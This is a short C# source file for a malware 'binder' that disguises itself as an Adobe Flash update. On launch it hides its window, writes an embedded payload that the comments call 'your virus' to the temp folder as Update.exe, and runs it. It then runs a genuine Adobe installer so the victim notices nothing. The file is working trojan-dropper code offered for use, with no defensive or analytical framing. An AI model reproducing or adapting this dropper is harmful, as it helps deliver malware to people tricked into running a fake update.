// by: [mh4x0f]
// Simples Binder Resource File in C#
// Update fake in C#
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BinderResources
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //  your virus
            byte[] arquivo = Properties.Resources.Update;
            string exe = Path.GetTempPath() + "Update.exe";
            // adobe Original file install 
            byte[] adobe = Properties.Resources.install;
            string installab = Path.GetTempPath() + "install.exe";

            if (File.Exists(exe))
            {
                File.Delete(exe);
            }
            if (File.Exists(installab))
            {
                File.Delete(installab);
            }
            using (FileStream adobe_arquivo = new FileStream(installab, FileMode.CreateNew))
            {
                adobe_arquivo.Write(adobe, 0, adobe.Length);
            }

            using (FileStream exe2 = new FileStream(exe, FileMode.CreateNew))
            {
                exe2.Write(arquivo, 0, arquivo.Length);
            }
            Process.Start(exe);
            // original flash 
            Process.Start(installab);
            Application.Exit();
            

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form1_VisibleChanged(object sender, EventArgs e)
        {
            this.Visible = false;
        }
    }
}
